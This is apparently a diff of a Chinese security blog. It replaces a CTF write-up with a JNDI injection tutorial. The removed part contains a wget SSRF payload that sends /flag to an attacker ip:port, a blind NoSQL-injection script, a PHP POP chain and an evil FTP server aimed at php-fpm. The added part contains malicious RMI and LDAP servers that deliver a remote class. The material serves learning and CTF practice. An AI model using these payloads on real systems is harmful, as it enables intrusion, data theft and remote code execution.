+	取消绑定命名对象。 </code></pre>
+
+<p>代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">package com.rmi.demo;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class jndi &#123;
+    public static void main(String[] args) throws NamingException &#123;
+        String uri &#x3D; &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;work&quot;;
+        InitialContext initialContext &#x3D; new InitialContext();
+        initialContext.lookup(uri);
     &#125;
-    c.JSON(http.StatusOK, gin.H&#123;&quot;data&quot;: result.String()&#125;)
 &#125;</code></pre>
 
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512232424874.png" alt="image-20220512232424874"></p>
-<p>这块一看就像为了防止ssrf才写出来的，（虽然我没看出来ssrf漏洞在哪，在我看来这还是利用了wget</p>
-<p>但是我们可以用<code>[::]</code>绕过对127.0.0.1的限制然后访问内网</p>
-<p>并且wget路由可以用来发送请求，那么就可以传入恶意的参数来获取服务器上文件并且外带出来，最终的payload（注意post发包改为application/json格式）</p>
-<p>payload</p>
-<pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;[::]:8080&#x2F;wget?argv&#x3D;-e+http_proxy&#x3D;http:&#x2F;&#x2F;ip:port&amp;argv&#x3D;--method&#x3D;POST&amp;argv&#x3D;--body-file&#x3D;&#x2F;flag&amp;argv&#x3D;http:&#x2F;&#x2F;ip:port&quot;&#125;</code></pre>
+<h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
+<h4 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h4><pre class="language-java" data-language="java"><code class="language-java">Reference(String className) 
+	为类名为“className”的对象构造一个新的引用。  
+Reference(String className, RefAddr addr) 
+	为类名为“className”的对象和地址构造一个新引用。  
+Reference(String className, RefAddr addr, String factory, String factoryLocation) 
+	为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  
+Reference(String className, String factory, String factoryLocation) 
+	为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </code></pre>
 
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512232841863.png" alt="image-20220512232841863"></p>
-<p>小tips：</p>
-<p>这个payload里<code>-e &quot;http_proxy=porxyhost:port&quot;</code>这部分是利用<code>wget -e &quot;http_proxy=porxyhost:port&quot; www.baidu.com</code>的形式获得代理设置的命令，但实际上根本用不到，因为argv参数从第二个开始取</p>
-<p>顺带提一下如果是curl命令就要用<code>curl -x proxyhost:port www.baidu.com</code>这种形式</p>
-<h3 id="三-nosql注入"><a href="#三-nosql注入" class="headerlink" title="三.nosql注入"></a>三.nosql注入</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513122251311.png" alt="image-20220513122251311"></p>
-<p>这里存在nosql注入</p>
-<p>所以可以根据这个获取admin的密码，脚本如下：</p>
-<p>脚本中使用//将该行之后的代码进行注释，并且通过补全代码使得代码完整<br>代码中判断是否成功用的是Pretend字符串，根据源码，如果用户名名称和密码判断不正确，就会返回含有Pretend的字符串</p>
-<pre class="language-python" data-language="python"><code class="language-python">import requests
+<p>代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;;
+Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url);</code></pre>
 
-url &#x3D; &quot;http:&#x2F;&#x2F;47.117.125.220:8081&#x2F;login&quot;#自行修改
+<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
+<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
+<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
+<h4 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h4><pre class="language-java" data-language="java"><code class="language-java">void add(int posn, RefAddr addr) 
+	将地址添加到索引posn的地址列表中。  
+void add(RefAddr addr) 
+	将地址添加到地址列表的末尾。  
+void clear() 
+	从此引用中删除所有地址。  
+RefAddr get(int posn) 
+	检索索引posn上的地址。  
+RefAddr get(String addrType) 
+	检索地址类型为“addrType”的第一个地址。  
+Enumeration&lt;RefAddr&gt; getAll() 
+	检索本参考文献中地址的列举。  
+String getClassName() 
+	检索引用引用的对象的类名。  
+String getFactoryClassLocation() 
+	检索此引用引用的对象的工厂位置。  
+String getFactoryClassName() 
+	检索此引用引用对象的工厂的类名。    
+Object remove(int posn) 
+	从地址列表中删除索引posn上的地址。  
+int size() 
+	检索此引用中的地址数。  
+String toString() 
+	生成此引用的字符串表示形式。  </code></pre>
 
-headers &#x3D; &#123;
-    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;
-&#125;
+<p>代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">package com.rmi.demo;
 
-strings &#x3D; &quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;
-
-res &#x3D; &quot;&quot;
-#res长度从0开始
-for i in range(len(res) + 1, 40):
-    if len(res) &#x3D;&#x3D; i - 1:
-        for c in strings:
-            data &#x3D; &#123;
-                #注意这个substr用的是-号，是反向读取密码的，反向逐个读取密码，然后对比
-                &quot;username&quot;: &quot;admin&#39;&amp;&amp;this.password.substr(-&quot; + str(i) + &quot;)&#x3D;&#x3D;&#39;&quot; + str(c + res) + &quot;&#39;) &#123;return true;&#125;&#125;)&#x2F;&#x2F;&quot;,
-                &quot;password&quot;: &quot;123456&quot;
-            &#125;
-            r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, data&#x3D;data)
-            if &quot;Pretend&quot; in r.text:
-                res &#x3D; c + res
-                print(&quot;[+] &quot; + res)
-                break
-    else:
-        print(&quot;[-] Failed&quot;)
-        break
-</code></pre>
-
-<p>不过没啥用，就算是admin登录了也没flag</p>
-<h2 id="eaaasyphp"><a href="#eaaasyphp" class="headerlink" title="eaaasyphp"></a>eaaasyphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-
-class Check &#123;
-    public static $str1 &#x3D; false;
-    public static $str2 &#x3D; false;
-&#125;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
 
 
-class Esle &#123;
-    public function __wakeup()
-    &#123;
-        Check::$str1 &#x3D; true;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class jndi &#123;
+    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException &#123;
+        String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;; 
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);
+        Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url);
+        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);
+        registry.bind(&quot;aa&quot;,referenceWrapper);
+
+
     &#125;
-&#125;
-
-
-class Hint &#123;
-
-    public function __wakeup()&#123;
-        $this-&gt;hint &#x3D; &quot;no hint&quot;;
-    &#125;
-
-    public function __destruct()&#123;
-        if(!$this-&gt;hint)&#123;
-            $this-&gt;hint &#x3D; &quot;phpinfo&quot;;
-            ($this-&gt;hint)();
-        &#125;  
-    &#125;
-&#125;
-
-
-class Bunny &#123;
-
-    public function __toString()
-    &#123;
-        if (Check::$str2) &#123;
-            if(!$this-&gt;data)&#123;
-                $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;];
-            &#125;
-            file_put_contents($this-&gt;filename, $this-&gt;data);
-        &#125; else &#123;
-            throw new Error(&quot;Error&quot;);
-        &#125;
-    &#125;
-&#125;
-
-class Welcome &#123;
-    public function __invoke()
-    &#123;
-        Check::$str2 &#x3D; true;
-        return &quot;Welcome&quot; . $this-&gt;username;
-    &#125;
-&#125;
-
-class Bypass &#123;
-
-    public function __destruct()
-    &#123;
-        if (Check::$str1) &#123;
-            ($this-&gt;str4)();
-        &#125; else &#123;
-            throw new Error(&quot;Error&quot;);
-        &#125;
-    &#125;
-&#125;
-
-if (isset($_GET[&#39;code&#39;])) &#123;
-    unserialize($_GET[&#39;code&#39;]);
-&#125; else &#123;
-    highlight_file(__FILE__);
 &#125;</code></pre>
 
-<p>这里有file_put_contents，文件名和内容都可控，可以试试写马，但是这里做了权限控制，写不了</p>
-<p>然后看到有hint类，里面能访问phpinfo尝试去反序列化执行这个类，绕过wakeup我们采用常用的修改方式</p>
-<pre class="language-txt" data-language="txt"><code class="language-txt">O:4:&quot;Hint&quot;:0:&#123;&#125;&#x3D;&gt;O:4:&quot;Hint&quot;:1:&#123;&#125;</code></pre>
-
-<p>发现并没有执行，因为wakeup的绕过在高版本被修复了，这里官方给了一个很有意思的绕过<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a></p>
-<p>将O改成C就能成功绕过，访问phpinfo，改成负数好像也可以</p>
-<p>除此之外还可以利用bypass类来访问phpinfo</p>
-<pre class="language-php" data-language="php"><code class="language-php">class Bypass &#123;
-    public function __construct()
-    &#123;
-        $this-&gt;test &#x3D; new Esle();
-        $this-&gt;str4 &#x3D; &#39;phpinfo&#39;;
+<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>以一个rmi服务为例子，你先得创建一个rmi服务，然后再创建JNDI的服务端和客户端，文件结构就是之前文章中的RMI基础上再加上JNDI服务端和客户端</p>
+<p>JNDI服务端</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class JNDIRMIServer &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        InitialContext initialContext&#x3D;new InitialContext();
+        initialContext.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,new IRemoteObjImpl());
     &#125;
-&#125;
+&#125;</code></pre>
 
-$a &#x3D; new Bypass();
-echo serialize($a);</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513124945406.png" alt="image-20220513124945406"></p>
-<p>在phpinfo里发现</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513125309445.png" alt="image-20220513125309445"></p>
-<p>那应该就是利用ftp(文件传输协议)的被动模式打php-fpm9000端口了</p>
-<h3 id="FTP的被动模式打php-fpm"><a href="#FTP的被动模式打php-fpm" class="headerlink" title="FTP的被动模式打php-fpm"></a>FTP的被动模式打php-fpm</h3><p>FTP 协议的被动模式：客户端试图从FTP服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的IP和端口上，我们可以指定到127.0.0.1:9000，这样就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF</p>
-<p>原理：</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513131104286.png" alt="image-20220513131104286"></p>
-<p>这里要先在vps上搭一个恶意的ftp服务</p>
-<pre class="language-python" data-language="python"><code class="language-python"># evil_ftp.py
-import socket
-s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-s.bind((&#39;0.0.0.0&#39;, 5002))
-s.listen(1)
-conn, addr &#x3D; s.accept()
-conn.send(b&#39;220 welcome\n&#39;)
-#Service ready for new user.
-#Client send anonymous username
-#USER anonymous
-conn.send(b&#39;331 Please specify the password.\n&#39;)
-#User name okay, need password.
-#Client send anonymous password.
-#PASS anonymous
-conn.send(b&#39;230 Login successful.\n&#39;)
-#User logged in, proceed. Logged out if appropriate.
-#TYPE I
-conn.send(b&#39;200 Switching to Binary mode.\n&#39;)
-#Size &#x2F;
-conn.send(b&#39;550 Could not get the file size.\n&#39;)
-#EPSV (1)
-conn.send(b&#39;150 ok\n&#39;)
-#PASV
-conn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#39;) #STOR &#x2F; (2)
-conn.send(b&#39;150 Permission denied.\n&#39;)
-#QUIT
-conn.send(b&#39;221 Goodbye.\n&#39;)
-conn.close()</code></pre>
-
-<p>然后利用gopherus生成打fastcgi的payload</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513135948923.png" alt="image-20220513135948923"></p>
-<p>我们只要9000/_后边的部分</p>
-<p>最后就是构造pop链调用file_put_contents</p>
-<p>这里有几个魔术方法</p>
-<pre class="language-txt" data-language="txt"><code class="language-txt">__wakeup():当调用unserialize时触发
-__toString():当类被当作字符串时调用
-__invoke():当把类当作函数处理时调用</code></pre>
-
-<p>pop链</p>
-<pre class="language-php" data-language="php"><code class="language-php">class Check &#123;
-    public static $str1 &#x3D; ture;
-    public static $str2 &#x3D; &#39;phpinfo&#39;;
-&#125;
-
-class Esle &#123;
-    public function __wakeup()
-    &#123;
-        Check::$str1 &#x3D; true;
+<p>JNDI客户端</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class JNDIRMIClient &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        InitialContext initialContext&#x3D;new InitialContext();
+        IRemoteObj lookup &#x3D; (IRemoteObj) initialContext.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;);
+        System.out.println(lookup.sayHello());
     &#125;
-&#125;
+&#125;</code></pre>
 
+<p>然后启动RMI服务端和JNDI服务端，再启动JNDI客户端，就能得到调用hello方法的结果（感觉和RMI区别不是很大</p>
+<p>这里跟一下lookup和rebind会发现其实调的就是RMI的时候的那个</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522220911731.png" alt="image-20230522220911731"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230522221121135.png" alt="image-20230522221121135"></p>
+<p>所以这里打rmi的几个方法打JNDI应该也行（<del>没试过，猜的</del>，试了一下客户端恶意传参打服务端和绕JEP290的payload，确实能打</p>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>JNDI注入有以下几个条件</p>
+<p>1.使用lookup</p>
+<p>2.参数可控</p>
+<p>在基本使用的部分，我们使用JNDI结合RMI进行了测试，但是在一般的JNDI注入中，我们绑定的都是引用对象（JNDI Reference）</p>
+<h2 id="基于RMI"><a href="#基于RMI" class="headerlink" title="基于RMI"></a>基于RMI</h2><p>先看基于RMI的JNDI注入，这里服务端代码为</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class JNDIRMIServer &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+&#x2F;&#x2F;        LocateRegistry.createRegistry(1099);
+        LocateRegistry.createRegistry(1099);
+        InitialContext initialContext&#x3D;new InitialContext();
+&#x2F;&#x2F;创建一个引用，第一个参数是恶意class的名字，第二个参数是beanfactory的名字，我们自定义(和class文件对应),第三个参数表示恶意class的地址。url最后的斜线一定要加，不然会访问不到对应的class文件
+        Reference reference &#x3D; new Reference(&quot;evil&quot;, &quot;evil&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;&quot;);
+        initialContext.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,reference);
 
-class Hint &#123;
-
-    public function __wakeup()&#123;
-        $this-&gt;hint &#x3D; &quot;no hint&quot;;
     &#125;
+&#125;</code></pre>
 
-    public function __destruct()&#123;
-        if(!$this-&gt;hint)&#123;
-            $this-&gt;hint &#x3D; &quot;phpinfo&quot;;
-            ($this-&gt;hint)();
+<p>这里第一个evil就相当于这个恶意class类叫evil.class，第二个evil就相当于这个evil.class里的evil类</p>
+<p>客户端</p>
+<pre class="language-java" data-language="java"><code class="language-java">import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+
+public class JNDIRMIClient &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        InitialContext initialContext&#x3D;new InitialContext();
+        IRemoteObj lookup &#x3D; (IRemoteObj) initialContext.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;);
+        System.out.println(lookup.sayHello());
+    &#125;
+&#125;</code></pre>
+
+<p>这东西原理其实挺简单的，就我们可以控制客户端lookup里的值，所以就可以控制客户端去请求我们的恶意服务端，然后服务端就会给客户端返回一个Reference类型的值，接下来客户端就想去找这个东西，这里找的过程是先去看本地有没有，本地没有就会去我们给的那个地址上去请求</p>
+<p>这里可以写一下流程</p>
+<p>首先是绑定的时候，之前RMI提到过，想绑定，那这个必须实现Remote接口和继承UnicastRemoteObject</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523172704114.png" alt="image-20230523172704114"></p>
+<p>那我们怎么能绑定它呢？</p>
+<p>首先想到的肯定是找个东西封装一下</p>
+<p>我们这里选择ReferenceWrapper类</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523172810330.png" alt="image-20230523172810330"></p>
+<p>所以有一些博客就在恶意服务端里加了一句</p>
+<p><code>ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</code></p>
+<p>但其实这是完全多余的行为</p>
+<p>我们可以跟一下调用的bind方法，可以知道最后在RegistyContext里会进RMI自己的lookup，同时还对我们传进去的东西执行了个encodeObject的方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173123316.png" alt="image-20230523173123316"></p>
+<p>跟进去可以看到，如果你是Reference类型的，就会自动给你加个ReferenceWrapper的封装，所以根本不需要我们手动添加</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173236636.png" alt="image-20230523173236636"></p>
+<p>然后再看客户端获取的时候，同样调到RegistyContext中的lookup里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173744160.png" alt="image-20230523173744160"></p>
+<p>然后进行一个解封装操作</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523173834984.png" alt="image-20230523173834984"></p>
+<p>然后在这行调用<code>NamingManager.getObjectInstance</code>，再其中又调用了getObjectFactoryFromReference，剩下的看注释就知道了，先找本地，再找远程</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523174224918.png" alt="image-20230523174224918"></p>
+<p>所以这里我把evil.class换个地方，然后本地开个服务</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523174519941.png" alt="image-20230523174519941"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523180101336.png" alt="image-20230523180101336"></p>
+<p>试了一下RMI的时候没试的操作</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523180527620.png" alt="image-20230523180527620"></p>
+<p>把恶意class文件放服务器上也行</p>
+<p>另外就是在8u121之后，RMI服务默认不允许远程加载，所以想要继续用得加一行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523180947115.png" alt="image-20230523180947115"></p>
+<p>至于为什么要加这一行，而不是加在RMI攻击服务端的时候的那几行，我也不知道，可能这也是JNDI和RMI的区别吧（，反正不加就报错告诉你要把这个值改成true</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523181046315.png" alt="image-20230523181046315"></p>
+<p>查了一下，在<code>JDK 6u141、7u131、8u121</code> 及以后的版本</p>
+<p>官方把</p>
+<pre class="language-none"><code class="language-none">com.sun.jndi.rmi.object.trustURLCodebase
+com.sun.jndi.cosnaming.object.trustURLCodebase</code></pre>
+
+<p>这两个值设为了false，所以不能再从codebase中加载类了，所以最开始的表好像确实不对</p>
+<h2 id="基于LDAP"><a href="#基于LDAP" class="headerlink" title="基于LDAP"></a>基于LDAP</h2><p>从上边那段我们知道，在8u121之后，由于trustURLCodebase的值默认为false，所以不能远程加载类了，除非被攻击的客户端还有<code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>这行代码。但是，希望要握在自己手中（。所以RMI不行了之后我们还可以试试LDAP</p>
+<p>其实主要是对trustURLCodebase这个值的判断放到RegistyContext里了，但是其实真正加载恶意类的是NamingManager里。所以用ldap就能绕过</p>
+<p><strong>LDAP介绍</strong></p>
+<p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
+<p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p>
+<p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下</p>
+<pre class="language-none"><code class="language-none">dn ：一条记录的详细位置
+dc ：一条记录所属区域    (哪一颗树)
+ou ：一条记录所属组织    （哪一个分支）
+cn&#x2F;uid：一条记录的名字&#x2F;ID   (哪一个苹果名字)
+...
+LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。</code></pre>
+
+<p>先安装LDAP的依赖</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
+
+<p>然后起一个恶意的LDAP的服务端</p>
+<pre class="language-java" data-language="java"><code class="language-java">package com;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+
+public class LDAPIRMServer&#123;
+
+    private static final String LDAP_BASE &#x3D; &quot;dc&#x3D;example,dc&#x3D;com&quot;;
+
+    public static void main ( String[] tmp_args ) &#123;
+        String[] args&#x3D;new String[]&#123;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;#EXP&quot;&#125;;&#x2F;&#x2F;这个EXP就是恶意class类的名
+        int port &#x3D; 9999;
+
+        try &#123;
+            InMemoryDirectoryServerConfig config &#x3D; new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, &#x2F;&#x2F;$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), &#x2F;&#x2F;$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+            InMemoryDirectoryServer ds &#x3D; new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); &#x2F;&#x2F;$NON-NLS-1$
+            ds.startListening();
+
+        &#125;
+        catch ( Exception e ) &#123;
+            e.printStackTrace();
         &#125;
     &#125;
-&#125;
 
-class Bunny &#123;
-    public function __construct()&#123;
-        $this-&gt;filename &#x3D;&#39;ftp:&#x2F;&#x2F;aaa@ip:5002&#x2F;123&#39;;#这里的端口号要和ftp的服务里的端口号一样
-    &#125;
-    public function __toString(): string
-    &#123;
-        if (Check::$str2) &#123;
-            if(!$this-&gt;data)&#123;
-                $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;];
+    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+
+        private URL codebase;
+
+        public OperationInterceptor ( URL cb ) &#123;
+            this.codebase &#x3D; cb;
+        &#125;
+
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;
+            String base &#x3D; result.getRequest().getBaseDN();
+            Entry e &#x3D; new Entry(base);
+            try &#123;
+                sendResult(result, base, e);
             &#125;
-            file_put_contents($this-&gt;filename, $this-&gt;data);
-        &#125; else &#123;
-            throw new Error(&quot;Error&quot;);
+            catch ( Exception e1 ) &#123;
+                e1.printStackTrace();
+            &#125;
         &#125;
-        return &#39;1&#39;;
-    &#125;
-&#125;
 
-class Welcome &#123;
-    public function __construct()&#123;
-        $this-&gt;username &#x3D; new Bunny();
-    &#125;
-    public function __invoke(): string
-    &#123;
-        Check::$str2 &#x3D; true;
-        return &quot;Welcome&quot; . $this-&gt;username;
-    &#125;
-&#125;
-
-class Bypass &#123;
-    public function __construct()
-    &#123;
-        $this -&gt; test &#x3D; new Esle();
-        $this -&gt;str4 &#x3D; new Welcome();
-    &#125;
-
-
-    public function __destruct()
-    &#123;
-        if (Check::$str1) &#123;
-            ($this-&gt;str4)();
-        &#125; else &#123;
-            throw new Error(&quot;Error&quot;);
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;
+            URL turl &#x3D; new URL(this.codebase, this.codebase.getRef().replace(&#39;.&#39;, &#39;&#x2F;&#39;).concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            String cbstring &#x3D; this.codebase.toString();
+            int refPos &#x3D; cbstring.indexOf(&#39;#&#39;);
+            if ( refPos &gt; 0 ) &#123;
+                cbstring &#x3D; cbstring.substring(0, refPos);
+            &#125;
+            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); &#x2F;&#x2F;$NON-NLS-1$
+            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         &#125;
     &#125;
-&#125;
+&#125;</code></pre>
 
-$a &#x3D; new Bypass();
-echo urlencode(serialize($a));</code></pre>
+<p>别问为啥这么写，固定的（，就改一下恶意类存放的地址就行</p>
+<p>客户端</p>
+<pre class="language-java" data-language="java"><code class="language-java">package com;
 
-<p>最终构造的payload为</p>
